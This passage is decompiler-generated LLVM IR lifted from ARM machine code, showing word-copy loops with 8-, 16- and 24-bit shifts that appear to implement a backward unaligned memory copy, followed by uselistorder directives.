  store i32 %v1_154b0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_154b0 = icmp eq i32 %v1_154b0, 0
  store i1 %v2_154b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_154b0, label %dec_label_pc_153f4, label %dec_label_pc_154b8

dec_label_pc_154b8:                               ; preds = %dec_label_pc_153ec, %dec_label_pc_154b0
  %v0_1550019 = phi i32 [ %v2_153d8, %dec_label_pc_153ec ], [ %v0_1550020, %dec_label_pc_154b0 ]
  %v0_155ac = phi i32 [ %v2_153dc, %dec_label_pc_153ec ], [ %v2_154a8, %dec_label_pc_154b0 ]
  %v0_154b8 = phi i32 [ %v2_153d4, %dec_label_pc_153ec ], [ %v0_154b0, %dec_label_pc_154b0 ]
  %v0_154c0 = phi i32 [ %v1_153ec, %dec_label_pc_153ec ], [ %v1_154b0, %dec_label_pc_154b0 ]
  %v1_154b8 = and i32 %v0_154b8, -4
  store i32 %v1_154b8, i32* %r1.global-to-local, align 4
  %v1_154bc = inttoptr i32 %v1_154b8 to i32*
  %v2_154bc = load i32, i32* %v1_154bc, align 4
  store i32 %v2_154bc, i32* @r3, align 4
  %v7_154c0 = icmp ult i32 %v0_154c0, 2
  %v2_155a4 = add i32 %v0_155ac, -12
  %v4_155a4 = sub i32 11, %v0_155ac
  %v5_155a4 = and i32 %v4_155a4, %v0_155ac
  %v6_155a4 = icmp slt i32 %v5_155a4, 0
  store i1 %v6_155a4, i1* %cpsr_v.global-to-local, align 1
  %v7_155a4 = icmp slt i32 %v2_155a4, 0
  store i1 %v7_155a4, i1* %cpsr_n.global-to-local, align 1
  %v8_155a4 = icmp eq i32 %v0_155ac, 12
  store i1 %v8_155a4, i1* %cpsr_z.global-to-local, align 1
  %v5_155a8 = icmp slt i32 %v0_155ac, 12
  br i1 %v7_154c0, label %dec_label_pc_155a4, label %dec_label_pc_154c8

dec_label_pc_154c8:                               ; preds = %dec_label_pc_154b8
  %v8_154c0 = icmp eq i32 %v0_154c0, 2
  br i1 %v8_154c0, label %dec_label_pc_15538, label %dec_label_pc_154cc

dec_label_pc_154cc:                               ; preds = %dec_label_pc_154c8
  br i1 %v5_155a8, label %dec_label_pc_15518, label %dec_label_pc_154d4

dec_label_pc_154d4:                               ; preds = %dec_label_pc_154cc
  store i32 %v2_155a4, i32* %r2.global-to-local, align 4
  %v3_154d8 = load i32, i32* @r4, align 4
  store i32 %v3_154d8, i32* %stack_var_-12, align 4
  %v6_154d8 = load i32, i32* @r5, align 4
  %v8_154d8 = inttoptr i32 %v6_154d8 to i8*
  store i8* %v8_154d8, i8** %stack_var_-8, align 4
  %v11_154d8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_154dc

dec_label_pc_154dc:                               ; preds = %dec_label_pc_154dc.dec_label_pc_154dc_crit_edge, %dec_label_pc_154d4
  %v0_15500 = phi i32 [ %v1_15500, %dec_label_pc_154dc.dec_label_pc_154dc_crit_edge ], [ %v0_1550019, %dec_label_pc_154d4 ]
  %v0_154e0 = phi i32 [ %v0_154e0.pre, %dec_label_pc_154dc.dec_label_pc_154dc_crit_edge ], [ %v1_154b8, %dec_label_pc_154d4 ]
  %v0_154dc = phi i32 [ %v0_154dc.pre, %dec_label_pc_154dc.dec_label_pc_154dc_crit_edge ], [ %v2_154bc, %dec_label_pc_154d4 ]
  %v3_154dc = mul i32 %v0_154dc, 256
  store i32 %v3_154dc, i32* %lr.global-to-local, align 4
  %v1_154e0 = add i32 %v0_154e0, -4
  %v2_154e0 = inttoptr i32 %v1_154e0 to i32*
  %v3_154e0 = load i32, i32* %v2_154e0, align 4
  store i32 %v3_154e0, i32* @r3, align 4
  %v4_154e0 = add i32 %v0_154e0, -8
  %v5_154e0 = inttoptr i32 %v4_154e0 to i32*
  %v6_154e0 = load i32, i32* %v5_154e0, align 4
  store i32 %v6_154e0, i32* %r4.global-to-local, align 4
  %v7_154e0 = add i32 %v0_154e0, -12
  %v8_154e0 = inttoptr i32 %v7_154e0 to i32*
  %v9_154e0 = load i32, i32* %v8_154e0, align 4
  store i32 %v9_154e0, i32* %r5.global-to-local, align 4
  %v10_154e0 = add i32 %v0_154e0, -16
  %v11_154e0 = inttoptr i32 %v10_154e0 to i32*
  %v12_154e0 = load i32, i32* %v11_154e0, align 4
  store i32 %v10_154e0, i32* %r1.global-to-local, align 4
  %v4_154e4 = udiv i32 %v12_154e0, 16777216
  %v5_154e4 = or i32 %v4_154e4, %v3_154dc
  store i32 %v5_154e4, i32* %lr.global-to-local, align 4
  %v3_154e8 = mul i32 %v12_154e0, 256
  %v4_154ec = udiv i32 %v9_154e0, 16777216
  %v5_154ec = or i32 %v3_154e8, %v4_154ec
  store i32 %v5_154ec, i32* @ip, align 4
  %v3_154f0 = mul i32 %v9_154e0, 256
  %v4_154f4 = udiv i32 %v6_154e0, 16777216
  %v5_154f4 = or i32 %v3_154f0, %v4_154f4
  store i32 %v5_154f4, i32* %r5.global-to-local, align 4
  %v3_154f8 = mul i32 %v6_154e0, 256
  %v4_154fc = udiv i32 %v3_154e0, 16777216
  %v5_154fc = or i32 %v3_154f8, %v4_154fc
  store i32 %v5_154fc, i32* %r4.global-to-local, align 4
  %v1_15500 = add i32 %v0_15500, -16
  %v2_15500 = inttoptr i32 %v1_15500 to i32*
  store i32 %v5_154fc, i32* %v2_15500, align 4
  %v4_15500 = add i32 %v0_15500, -12
  %v5_15500 = inttoptr i32 %v4_15500 to i32*
  %v6_15500 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15500, i32* %v5_15500, align 4
  %v7_15500 = add i32 %v0_15500, -8
  %v8_15500 = inttoptr i32 %v7_15500 to i32*
  %v9_15500 = load i32, i32* @ip, align 4
  store i32 %v9_15500, i32* %v8_15500, align 4
  %v10_15500 = add i32 %v0_15500, -4
  %v11_15500 = inttoptr i32 %v10_15500 to i32*
  %v12_15500 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15500, i32* %v11_15500, align 4
  store i32 %v1_15500, i32* %r0.global-to-local, align 4
  %v0_15504 = load i32, i32* %r2.global-to-local, align 4
  %v2_15504 = add i32 %v0_15504, -16
  store i32 %v2_15504, i32* %r2.global-to-local, align 4
  %v6_15508 = icmp slt i32 %v0_15504, 16
  br i1 %v6_15508, label %dec_label_pc_1550c, label %dec_label_pc_154dc.dec_label_pc_154dc_crit_edge

dec_label_pc_154dc.dec_label_pc_154dc_crit_edge:  ; preds = %dec_label_pc_154dc
  %v0_154dc.pre = load i32, i32* @r3, align 4
  %v0_154e0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154dc

dec_label_pc_1550c:                               ; preds = %dec_label_pc_154dc
  %v2_1550c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1550c, i32* @r4, align 4
  %v5_1550c = load i8*, i8** %stack_var_-8, align 4
  %v6_1550c = ptrtoint i8* %v5_1550c to i32
  store i32 %v6_1550c, i32* @r5, align 4
  store i32 %v11_154d8, i32* @lr, align 4
  %v2_15510 = add i32 %v0_15504, -4
  store i32 %v2_15510, i32* %r2.global-to-local, align 4
  %v4_15510 = add i32 %v0_15504, 2147483632
  %v5_15510 = and i32 %v2_15510, %v4_15510
  %v6_15510 = icmp slt i32 %v5_15510, 0
  store i1 %v6_15510, i1* %cpsr_v.global-to-local, align 1
  %v7_15510 = icmp slt i32 %v2_15510, 0
  store i1 %v7_15510, i1* %cpsr_n.global-to-local, align 1
  %v8_15510 = icmp eq i32 %v2_15510, 0
  store i1 %v8_15510, i1* %cpsr_z.global-to-local, align 1
  %v5_15514 = icmp slt i32 %v2_15504, -12
  br i1 %v5_15514, label %dec_label_pc_15530, label %dec_label_pc_15518

dec_label_pc_15518:                               ; preds = %dec_label_pc_1550c, %dec_label_pc_154cc, %dec_label_pc_15518
  %v1_15524 = phi i32 [ %v5_15524, %dec_label_pc_15518 ], [ %v1_15500, %dec_label_pc_1550c ], [ %v0_1550019, %dec_label_pc_154cc ]
  %v0_15518 = load i32, i32* @r3, align 4
  %v3_15518 = mul i32 %v0_15518, 256
  store i32 %v3_15518, i32* %ip.global-to-local, align 4
  %v0_1551c = load i32, i32* %r1.global-to-local, align 4
  %v1_1551c = add i32 %v0_1551c, -4
  %v2_1551c = inttoptr i32 %v1_1551c to i32*
  %v3_1551c = load i32, i32* %v2_1551c, align 4
  store i32 %v3_1551c, i32* @r3, align 4
  store i32 %v1_1551c, i32* %r1.global-to-local, align 4
  %v4_15520 = udiv i32 %v3_1551c, 16777216
  %v5_15520 = or i32 %v4_15520, %v3_15518
  store i32 %v5_15520, i32* @ip, align 4
  %v2_15524 = add i32 %v1_15524, -4
  %v3_15524 = inttoptr i32 %v2_15524 to i32*
  store i32 %v5_15520, i32* %v3_15524, align 4
  %v4_15524 = load i32, i32* %r0.global-to-local, align 4
  %v5_15524 = add i32 %v4_15524, -4
  store i32 %v5_15524, i32* %r0.global-to-local, align 4
  %v0_15528 = load i32, i32* %r2.global-to-local, align 4
  %v2_15528 = add i32 %v0_15528, -4
  store i32 %v2_15528, i32* %r2.global-to-local, align 4
  %v6_1552c = icmp slt i32 %v0_15528, 4
  br i1 %v6_1552c, label %dec_label_pc_15530.loopexit, label %dec_label_pc_15518

dec_label_pc_15530.loopexit:                      ; preds = %dec_label_pc_15518
  %v4_15528 = sub i32 3, %v0_15528
  %v5_15528 = and i32 %v4_15528, %v0_15528
  %v6_15528 = icmp slt i32 %v5_15528, 0
  %v7_15528 = icmp slt i32 %v2_15528, 0
  store i1 %v6_15528, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15528, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15530

dec_label_pc_15530:                               ; preds = %dec_label_pc_15530.loopexit, %dec_label_pc_1550c
  %v2_1547451 = phi i32 [ %v5_15524, %dec_label_pc_15530.loopexit ], [ %v1_15500, %dec_label_pc_1550c ]
  %v0_1546447 = phi i32 [ %v2_15528, %dec_label_pc_15530.loopexit ], [ %v2_15510, %dec_label_pc_1550c ]
  %v0_15530 = load i32, i32* %r1.global-to-local, align 4
  %v1_15530 = add i32 %v0_15530, 3
  store i32 %v1_15530, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_15538:                               ; preds = %dec_label_pc_154c8
  br i1 %v5_155a8, label %dec_label_pc_15584, label %dec_label_pc_15540

dec_label_pc_15540:                               ; preds = %dec_label_pc_15538
  store i32 %v2_155a4, i32* %r2.global-to-local, align 4
  %v3_15544 = load i32, i32* @r4, align 4
  store i32 %v3_15544, i32* %stack_var_-12, align 4
  %v6_15544 = load i32, i32* @r5, align 4
  %v8_15544 = inttoptr i32 %v6_15544 to i8*
  store i8* %v8_15544, i8** %stack_var_-8, align 4
  %v11_15544 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15548

dec_label_pc_15548:                               ; preds = %dec_label_pc_15548.dec_label_pc_15548_crit_edge, %dec_label_pc_15540
  %v0_1556c = phi i32 [ %v1_1556c, %dec_label_pc_15548.dec_label_pc_15548_crit_edge ], [ %v0_1550019, %dec_label_pc_15540 ]
  %v0_1554c = phi i32 [ %v0_1554c.pre, %dec_label_pc_15548.dec_label_pc_15548_crit_edge ], [ %v1_154b8, %dec_label_pc_15540 ]
  %v0_15548 = phi i32 [ %v0_15548.pre, %dec_label_pc_15548.dec_label_pc_15548_crit_edge ], [ %v2_154bc, %dec_label_pc_15540 ]
  %v3_15548 = mul i32 %v0_15548, 65536
  store i32 %v3_15548, i32* %lr.global-to-local, align 4
  %v1_1554c = add i32 %v0_1554c, -4
  %v2_1554c = inttoptr i32 %v1_1554c to i32*
  %v3_1554c = load i32, i32* %v2_1554c, align 4
  store i32 %v3_1554c, i32* @r3, align 4
  %v4_1554c = add i32 %v0_1554c, -8
  %v5_1554c = inttoptr i32 %v4_1554c to i32*
  %v6_1554c = load i32, i32* %v5_1554c, align 4
  store i32 %v6_1554c, i32* %r4.global-to-local, align 4
  %v7_1554c = add i32 %v0_1554c, -12
  %v8_1554c = inttoptr i32 %v7_1554c to i32*
  %v9_1554c = load i32, i32* %v8_1554c, align 4
  store i32 %v9_1554c, i32* %r5.global-to-local, align 4
  %v10_1554c = add i32 %v0_1554c, -16
  %v11_1554c = inttoptr i32 %v10_1554c to i32*
  %v12_1554c = load i32, i32* %v11_1554c, align 4
  store i32 %v10_1554c, i32* %r1.global-to-local, align 4
  %v4_15550 = udiv i32 %v12_1554c, 65536
  %v5_15550 = or i32 %v4_15550, %v3_15548
  store i32 %v5_15550, i32* %lr.global-to-local, align 4
  %v3_15554 = mul i32 %v12_1554c, 65536
  %v4_15558 = udiv i32 %v9_1554c, 65536
  %v5_15558 = or i32 %v3_15554, %v4_15558
  store i32 %v5_15558, i32* @ip, align 4
  %v3_1555c = mul i32 %v9_1554c, 65536
  %v4_15560 = udiv i32 %v6_1554c, 65536
  %v5_15560 = or i32 %v3_1555c, %v4_15560
  store i32 %v5_15560, i32* %r5.global-to-local, align 4
  %v3_15564 = mul i32 %v6_1554c, 65536
  %v4_15568 = udiv i32 %v3_1554c, 65536
  %v5_15568 = or i32 %v3_15564, %v4_15568
  store i32 %v5_15568, i32* %r4.global-to-local, align 4
  %v1_1556c = add i32 %v0_1556c, -16
  %v2_1556c = inttoptr i32 %v1_1556c to i32*
  store i32 %v5_15568, i32* %v2_1556c, align 4
  %v4_1556c = add i32 %v0_1556c, -12
  %v5_1556c = inttoptr i32 %v4_1556c to i32*
  %v6_1556c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1556c, i32* %v5_1556c, align 4
  %v7_1556c = add i32 %v0_1556c, -8
  %v8_1556c = inttoptr i32 %v7_1556c to i32*
  %v9_1556c = load i32, i32* @ip, align 4
  store i32 %v9_1556c, i32* %v8_1556c, align 4
  %v10_1556c = add i32 %v0_1556c, -4
  %v11_1556c = inttoptr i32 %v10_1556c to i32*
  %v12_1556c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1556c, i32* %v11_1556c, align 4
  store i32 %v1_1556c, i32* %r0.global-to-local, align 4
  %v0_15570 = load i32, i32* %r2.global-to-local, align 4
  %v2_15570 = add i32 %v0_15570, -16
  store i32 %v2_15570, i32* %r2.global-to-local, align 4
  %v6_15574 = icmp slt i32 %v0_15570, 16
  br i1 %v6_15574, label %dec_label_pc_15578, label %dec_label_pc_15548.dec_label_pc_15548_crit_edge

dec_label_pc_15548.dec_label_pc_15548_crit_edge:  ; preds = %dec_label_pc_15548
  %v0_15548.pre = load i32, i32* @r3, align 4
  %v0_1554c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15548

dec_label_pc_15578:                               ; preds = %dec_label_pc_15548
  %v2_15578 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15578, i32* @r4, align 4
  %v5_15578 = load i8*, i8** %stack_var_-8, align 4
  %v6_15578 = ptrtoint i8* %v5_15578 to i32
  store i32 %v6_15578, i32* @r5, align 4
  store i32 %v11_15544, i32* @lr, align 4
  %v2_1557c = add i32 %v0_15570, -4
  store i32 %v2_1557c, i32* %r2.global-to-local, align 4
  %v4_1557c = add i32 %v0_15570, 2147483632
  %v5_1557c = and i32 %v2_1557c, %v4_1557c
  %v6_1557c = icmp slt i32 %v5_1557c, 0
  store i1 %v6_1557c, i1* %cpsr_v.global-to-local, align 1
  %v7_1557c = icmp slt i32 %v2_1557c, 0
  store i1 %v7_1557c, i1* %cpsr_n.global-to-local, align 1
  %v8_1557c = icmp eq i32 %v2_1557c, 0
  store i1 %v8_1557c, i1* %cpsr_z.global-to-local, align 1
  %v5_15580 = icmp slt i32 %v2_15570, -12
  br i1 %v5_15580, label %dec_label_pc_1559c, label %dec_label_pc_15584

dec_label_pc_15584:                               ; preds = %dec_label_pc_15578, %dec_label_pc_15538, %dec_label_pc_15584
  %v1_15590 = phi i32 [ %v5_15590, %dec_label_pc_15584 ], [ %v1_1556c, %dec_label_pc_15578 ], [ %v0_1550019, %dec_label_pc_15538 ]
  %v0_15584 = load i32, i32* @r3, align 4
  %v3_15584 = mul i32 %v0_15584, 65536
  store i32 %v3_15584, i32* %ip.global-to-local, align 4
  %v0_15588 = load i32, i32* %r1.global-to-local, align 4
  %v1_15588 = add i32 %v0_15588, -4
  %v2_15588 = inttoptr i32 %v1_15588 to i32*
  %v3_15588 = load i32, i32* %v2_15588, align 4
  store i32 %v3_15588, i32* @r3, align 4
  store i32 %v1_15588, i32* %r1.global-to-local, align 4
  %v4_1558c = udiv i32 %v3_15588, 65536
  %v5_1558c = or i32 %v4_1558c, %v3_15584
  store i32 %v5_1558c, i32* @ip, align 4
  %v2_15590 = add i32 %v1_15590, -4
  %v3_15590 = inttoptr i32 %v2_15590 to i32*
  store i32 %v5_1558c, i32* %v3_15590, align 4
  %v4_15590 = load i32, i32* %r0.global-to-local, align 4
  %v5_15590 = add i32 %v4_15590, -4
  store i32 %v5_15590, i32* %r0.global-to-local, align 4
  %v0_15594 = load i32, i32* %r2.global-to-local, align 4
  %v2_15594 = add i32 %v0_15594, -4
  store i32 %v2_15594, i32* %r2.global-to-local, align 4
  %v6_15598 = icmp slt i32 %v0_15594, 4
  br i1 %v6_15598, label %dec_label_pc_1559c.loopexit, label %dec_label_pc_15584

dec_label_pc_1559c.loopexit:                      ; preds = %dec_label_pc_15584
  %v4_15594 = sub i32 3, %v0_15594
  %v5_15594 = and i32 %v4_15594, %v0_15594
  %v6_15594 = icmp slt i32 %v5_15594, 0
  %v7_15594 = icmp slt i32 %v2_15594, 0
  store i1 %v6_15594, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15594, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1559c

dec_label_pc_1559c:                               ; preds = %dec_label_pc_1559c.loopexit, %dec_label_pc_15578
  %v2_1547452 = phi i32 [ %v5_15590, %dec_label_pc_1559c.loopexit ], [ %v1_1556c, %dec_label_pc_15578 ]
  %v0_1546448 = phi i32 [ %v2_15594, %dec_label_pc_1559c.loopexit ], [ %v2_1557c, %dec_label_pc_15578 ]
  %v0_1559c = load i32, i32* %r1.global-to-local, align 4
  %v1_1559c = add i32 %v0_1559c, 2
  store i32 %v1_1559c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_155a4:                               ; preds = %dec_label_pc_154b8
  br i1 %v5_155a8, label %dec_label_pc_155f0, label %dec_label_pc_155ac

dec_label_pc_155ac:                               ; preds = %dec_label_pc_155a4
  store i32 %v2_155a4, i32* %r2.global-to-local, align 4
  %v3_155b0 = load i32, i32* @r4, align 4
  store i32 %v3_155b0, i32* %stack_var_-12, align 4
  %v6_155b0 = load i32, i32* @r5, align 4
  %v8_155b0 = inttoptr i32 %v6_155b0 to i8*
  store i8* %v8_155b0, i8** %stack_var_-8, align 4
  %v11_155b0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_155b4

dec_label_pc_155b4:                               ; preds = %dec_label_pc_155b4.dec_label_pc_155b4_crit_edge, %dec_label_pc_155ac
  %v0_155d8 = phi i32 [ %v1_155d8, %dec_label_pc_155b4.dec_label_pc_155b4_crit_edge ], [ %v0_1550019, %dec_label_pc_155ac ]
  %v0_155b8 = phi i32 [ %v0_155b8.pre, %dec_label_pc_155b4.dec_label_pc_155b4_crit_edge ], [ %v1_154b8, %dec_label_pc_155ac ]
  %v0_155b4 = phi i32 [ %v0_155b4.pre, %dec_label_pc_155b4.dec_label_pc_155b4_crit_edge ], [ %v2_154bc, %dec_label_pc_155ac ]
  %v3_155b4 = mul i32 %v0_155b4, 16777216
  store i32 %v3_155b4, i32* %lr.global-to-local, align 4
  %v1_155b8 = add i32 %v0_155b8, -4
  %v2_155b8 = inttoptr i32 %v1_155b8 to i32*
  %v3_155b8 = load i32, i32* %v2_155b8, align 4
  store i32 %v3_155b8, i32* @r3, align 4
  %v4_155b8 = add i32 %v0_155b8, -8
  %v5_155b8 = inttoptr i32 %v4_155b8 to i32*
  %v6_155b8 = load i32, i32* %v5_155b8, align 4
  store i32 %v6_155b8, i32* %r4.global-to-local, align 4
  %v7_155b8 = add i32 %v0_155b8, -12
  %v8_155b8 = inttoptr i32 %v7_155b8 to i32*
  %v9_155b8 = load i32, i32* %v8_155b8, align 4
  store i32 %v9_155b8, i32* %r5.global-to-local, align 4
  %v10_155b8 = add i32 %v0_155b8, -16
  %v11_155b8 = inttoptr i32 %v10_155b8 to i32*
  %v12_155b8 = load i32, i32* %v11_155b8, align 4
  store i32 %v10_155b8, i32* %r1.global-to-local, align 4
  %v4_155bc = udiv i32 %v12_155b8, 256
  %v5_155bc = or i32 %v4_155bc, %v3_155b4
  store i32 %v5_155bc, i32* %lr.global-to-local, align 4
  %v3_155c0 = mul i32 %v12_155b8, 16777216
  %v4_155c4 = udiv i32 %v9_155b8, 256
  %v5_155c4 = or i32 %v3_155c0, %v4_155c4
  store i32 %v5_155c4, i32* @ip, align 4
  %v3_155c8 = mul i32 %v9_155b8, 16777216
  %v4_155cc = udiv i32 %v6_155b8, 256
  %v5_155cc = or i32 %v3_155c8, %v4_155cc
  store i32 %v5_155cc, i32* %r5.global-to-local, align 4
  %v3_155d0 = mul i32 %v6_155b8, 16777216
  %v4_155d4 = udiv i32 %v3_155b8, 256
  %v5_155d4 = or i32 %v3_155d0, %v4_155d4
  store i32 %v5_155d4, i32* %r4.global-to-local, align 4
  %v1_155d8 = add i32 %v0_155d8, -16
  %v2_155d8 = inttoptr i32 %v1_155d8 to i32*
  store i32 %v5_155d4, i32* %v2_155d8, align 4
  %v4_155d8 = add i32 %v0_155d8, -12
  %v5_155d8 = inttoptr i32 %v4_155d8 to i32*
  %v6_155d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_155d8, i32* %v5_155d8, align 4
  %v7_155d8 = add i32 %v0_155d8, -8
  %v8_155d8 = inttoptr i32 %v7_155d8 to i32*
  %v9_155d8 = load i32, i32* @ip, align 4
  store i32 %v9_155d8, i32* %v8_155d8, align 4
  %v10_155d8 = add i32 %v0_155d8, -4
  %v11_155d8 = inttoptr i32 %v10_155d8 to i32*
  %v12_155d8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_155d8, i32* %v11_155d8, align 4
  store i32 %v1_155d8, i32* %r0.global-to-local, align 4
  %v0_155dc = load i32, i32* %r2.global-to-local, align 4
  %v2_155dc = add i32 %v0_155dc, -16
  store i32 %v2_155dc, i32* %r2.global-to-local, align 4
  %v6_155e0 = icmp slt i32 %v0_155dc, 16
  br i1 %v6_155e0, label %dec_label_pc_155e4, label %dec_label_pc_155b4.dec_label_pc_155b4_crit_edge

dec_label_pc_155b4.dec_label_pc_155b4_crit_edge:  ; preds = %dec_label_pc_155b4
  %v0_155b4.pre = load i32, i32* @r3, align 4
  %v0_155b8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_155b4

dec_label_pc_155e4:                               ; preds = %dec_label_pc_155b4
  %v2_155e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_155e4, i32* @r4, align 4
  %v5_155e4 = load i8*, i8** %stack_var_-8, align 4
  %v6_155e4 = ptrtoint i8* %v5_155e4 to i32
  store i32 %v6_155e4, i32* @r5, align 4
  store i32 %v11_155b0, i32* @lr, align 4
  %v2_155e8 = add i32 %v0_155dc, -4
  store i32 %v2_155e8, i32* %r2.global-to-local, align 4
  %v4_155e8 = add i32 %v0_155dc, 2147483632
  %v5_155e8 = and i32 %v2_155e8, %v4_155e8
  %v6_155e8 = icmp slt i32 %v5_155e8, 0
  store i1 %v6_155e8, i1* %cpsr_v.global-to-local, align 1
  %v7_155e8 = icmp slt i32 %v2_155e8, 0
  store i1 %v7_155e8, i1* %cpsr_n.global-to-local, align 1
  %v8_155e8 = icmp eq i32 %v2_155e8, 0
  store i1 %v8_155e8, i1* %cpsr_z.global-to-local, align 1
  %v5_155ec = icmp slt i32 %v2_155dc, -12
  br i1 %v5_155ec, label %dec_label_pc_15608, label %dec_label_pc_155f0

dec_label_pc_155f0:                               ; preds = %dec_label_pc_155e4, %dec_label_pc_155a4, %dec_label_pc_155f0
  %v1_155fc = phi i32 [ %v5_155fc, %dec_label_pc_155f0 ], [ %v1_155d8, %dec_label_pc_155e4 ], [ %v0_1550019, %dec_label_pc_155a4 ]
  %v0_155f0 = load i32, i32* @r3, align 4
  %v3_155f0 = mul i32 %v0_155f0, 16777216
  store i32 %v3_155f0, i32* %ip.global-to-local, align 4
  %v0_155f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_155f4 = add i32 %v0_155f4, -4
  %v2_155f4 = inttoptr i32 %v1_155f4 to i32*
  %v3_155f4 = load i32, i32* %v2_155f4, align 4
  store i32 %v3_155f4, i32* @r3, align 4
  store i32 %v1_155f4, i32* %r1.global-to-local, align 4
  %v4_155f8 = udiv i32 %v3_155f4, 256
  %v5_155f8 = or i32 %v4_155f8, %v3_155f0
  store i32 %v5_155f8, i32* @ip, align 4
  %v2_155fc = add i32 %v1_155fc, -4
  %v3_155fc = inttoptr i32 %v2_155fc to i32*
  store i32 %v5_155f8, i32* %v3_155fc, align 4
  %v4_155fc = load i32, i32* %r0.global-to-local, align 4
  %v5_155fc = add i32 %v4_155fc, -4
  store i32 %v5_155fc, i32* %r0.global-to-local, align 4
  %v0_15600 = load i32, i32* %r2.global-to-local, align 4
  %v2_15600 = add i32 %v0_15600, -4
  store i32 %v2_15600, i32* %r2.global-to-local, align 4
  %v6_15604 = icmp slt i32 %v0_15600, 4
  br i1 %v6_15604, label %dec_label_pc_15608.loopexit, label %dec_label_pc_155f0

dec_label_pc_15608.loopexit:                      ; preds = %dec_label_pc_155f0
  %v4_15600 = sub i32 3, %v0_15600
  %v5_15600 = and i32 %v4_15600, %v0_15600
  %v6_15600 = icmp slt i32 %v5_15600, 0
  %v7_15600 = icmp slt i32 %v2_15600, 0
  store i1 %v6_15600, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15600, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15608

dec_label_pc_15608:                               ; preds = %dec_label_pc_15608.loopexit, %dec_label_pc_155e4
  %v2_1547453 = phi i32 [ %v5_155fc, %dec_label_pc_15608.loopexit ], [ %v1_155d8, %dec_label_pc_155e4 ]
  %v0_1546449 = phi i32 [ %v2_15600, %dec_label_pc_15608.loopexit ], [ %v2_155e8, %dec_label_pc_155e4 ]
  %v0_15608 = load i32, i32* %r1.global-to-local, align 4
  %v1_15608 = add i32 %v0_15608, 1
  store i32 %v1_15608, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_155fc, { 0, 2, 1 }
  uselistorder i32 %v3_155f0, { 1, 0 }
  uselistorder i32 %v2_155e8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_155d8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_155b8, { 1, 0 }
  uselistorder i32 %v3_155b4, { 1, 0 }
  uselistorder i32 %v0_155b8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_155d8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15590, { 0, 2, 1 }
  uselistorder i32 %v3_15584, { 1, 0 }
  uselistorder i32 %v2_1557c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1556c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1554c, { 1, 0 }
  uselistorder i32 %v3_15548, { 1, 0 }
  uselistorder i32 %v0_1554c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1556c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15524, { 0, 2, 1 }
  uselistorder i32 %v3_15518, { 1, 0 }
  uselistorder i32 %v2_15510, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15500, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_154e0, { 1, 0 }
  uselistorder i32 %v3_154dc, { 1, 0 }
  uselistorder i32 %v0_154e0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15500, { 3, 2, 1, 0 }
  uselistorder i1 %v5_155a8, { 2, 0, 1 }
  uselistorder i32 %v0_154c0, { 1, 0 }
  uselistorder i32 %v0_155ac, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1550019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_154b0, { 2, 1, 0 }
  uselistorder i32 %v0_154b0, { 2, 0, 1 }
  uselistorder i32 %v2_154a8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_154a8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_154a8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1550020, { 2, 1, 0 }
  uselistorder i32 %v11_15484, { 1, 0 }
  uselistorder i32 %v7_15484, { 1, 0 }
  uselistorder i32 %v1_15464, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15464, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15468, { 1, 0 }
  uselistorder i32 %v7_1545c, { 0, 2, 1 }
  uselistorder i32 %v10_15458, { 1, 0 }
  uselistorder i32 %v9_15450, { 1, 0, 2 }
  uselistorder i32 %v6_1544c, { 1, 0 }
  uselistorder i32 %v2_15444, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_15444, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15454, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15438, { 0, 2, 1 }
  uselistorder i32 %v13_15434, { 1, 0 }
  uselistorder i32 %v4_15430, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_15430, { 2, 0, 1 }
  uselistorder i32 %v6_15438, { 0, 3, 2, 1 }
